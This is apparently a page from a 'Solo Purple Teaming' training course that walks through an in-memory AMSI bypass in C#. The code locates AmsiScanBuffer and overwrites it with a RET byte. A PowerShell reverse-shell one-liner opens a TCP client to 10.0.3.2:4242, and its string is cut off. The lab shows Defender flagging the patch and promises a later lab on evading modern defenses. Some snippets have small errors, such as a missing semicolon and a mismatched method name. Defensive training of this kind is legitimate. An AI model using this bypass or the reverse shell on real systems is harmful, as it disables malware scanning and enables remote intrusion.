---
layout: default
title: "When Patching Does Not Go As Planned"
permalink: /solo-purple-teaming/when-patching-does-not-go-as-planned/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>When Patching Does Not Go As Planned</h1>
</section>
<section class="spt-content">

Owner: Mike Sterrett

## 🎯 Introduction

In cybersecurity, there is a continuous cat-and-mouse game between offensive and defensive strategies. Every evasion method, including AMSI bypasses, has a limited shelf life. Once an evasion technique becomes public, security vendors rapidly analyze it and implement countermeasures.

Understanding **how** these techniques work is essential—not just replicating them. In this lab, you'll learn how to perform an AMSI bypass in memory using C#, and more importantly, how to adapt your evasion strategy as defenses evolve.

> ⚠️ This lab is for educational purposes only. All demonstrations should remain within controlled environments. Ethical disclosure of new bypasses is essential to strengthening collective security.
> 

---

## 🧪 Lab Objective

- Load `amsi.dll` into memory.
- Locate and patch the `AmsiScanBuffer` function.
- Overwrite the function with a `RET` instruction to disable AMSI scanning.
- Restore original memory protections.
- Demonstrate detection by Defender.

---

## 🖥️ Setting Up the Environment

> "I'm currently logged into my reverse engineering VM with the AttachDebugger C# project open."
> 

We begin by importing unmanaged functions from `kernel32.dll` that we need to manipulate memory.

### 🧩 DLL Imports

- `GetProcAddress` locates the memory address of a target function.
- `VirtualProtect` changes memory permissions to allow patching.

```
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
```

---

## 🔧 Writing the Patch Function

### C# – `Patch()` Method

```
static void Patch()
{
    Process thisProcess = Process.GetCurrentProcess();

    foreach (ProcessModule module in thisProcess.Modules)
    {
        if (module.ModuleName.Equals("amsi.dll", StringComparison.OrdinalIgnoreCase))
        {
            IntPtr pointer = GetProcAddress(module.BaseAddress, "AmsiScanBuffer");
            uint oldProtect;
            bool success = VirtualProtect(pointer, (UIntPtr)0x1, 0x40, out oldProtect);
            if (success)
            {

            byte[] fix = new byte[] { 0xC3 };
            Marshal.Copy(fix, 0, pointer, fix.Length);
            success=VirtualProtect(pointer, (UIntPtr)0x1, oldProtect, out oldProtect);
            }
        }
    }
}
```

---

## ⚙️ Triggering AMSI Load Safely

> "AMSI is not loaded when the app starts. It loads only when PowerShell executes."
> 

We want to avoid loading a malicious payload too early. Instead, use a safe PowerShell command to trigger AMSI loading.

### PowerShell Trigger

```
static void Main(string[] args)
{
    Console.ReadLine();
    PowerShell ps = PowerShell.Create();
    string script = "whoami"; 
    ps.AddScript(script)
    Collection<PSObject> results = ps.Invoke();
    
    foreach (PSObject obj in results)
    {    
        Console.WriteLine(obj.ToString());
    }
    patch();
    Console.ReadLine();
    script = "$client = New-Object System.Net.Sockets.TCPClient('10.0.3.2',4242);$stream = $client.GetStream();[byte[]]$byte
    ps.AddScript(script);
    results = ps.Invoke();
    
    foreach (PSObject obj in results)
    {
        Console.WriteLine(obj.ToString());
    }
```

---

## 🧪 Execution Steps

1. Open a terminal and run the commands below:
    
    ```
    cd source/repos/AttachDebuggerTest/AttachDebuggerTest/bin/x64/Debug
    AttachDebuggerTest.exe
    ```
    
2. Open **System Informer** (or Process Hacker).

![image.png](When%20Patching%20Does%20Not%20Go%20As%20Planned/image.png)

As seen above: `amsi.dll` is **not loaded** initially.

1. Run the script. AMSI will now be loaded.

![image.png](When%20Patching%20Does%20Not%20Go%20As%20Planned/image%201.png)

1. The patch executes, attempting to overwrite `AmsiScanBuffer`.

---

## 🚨 Defender Detection

> "Defender just blocked our patch."
> 

![image.png](When%20Patching%20Does%20Not%20Go%20As%20Planned/image%202.png)

After running the patch:

- Open **Windows Security** → **Protection History**.
- Notice how the patching behavior was detected.

![image.png](When%20Patching%20Does%20Not%20Go%20As%20Planned/image%203.png)

> This demonstrates that while the technique works in theory, it has been fingerprinted by Defender.
> 

---

## 📌 Key Takeaways

- Every bypass has a lifecycle. This one has been flagged by modern EDRs.
- You must understand **why** the technique works to adapt and innovate.
- Always expect that today's working patch may fail tomorrow.

---

## 🔄 Coming Up Next: Evasion Techniques

> In our next lecture, we’ll dive into detection evasion.
> 

Topics to explore:

- Payload obfuscation
- Indirect memory patching
- Inline hook evasion

> "Evasion is a discipline. It takes persistence, creativity, and ethical responsibility."
> 

Be ready to build a fully functioning AMSI bypass that can evade modern defenses. See you in the next lab!

</section>
</div>
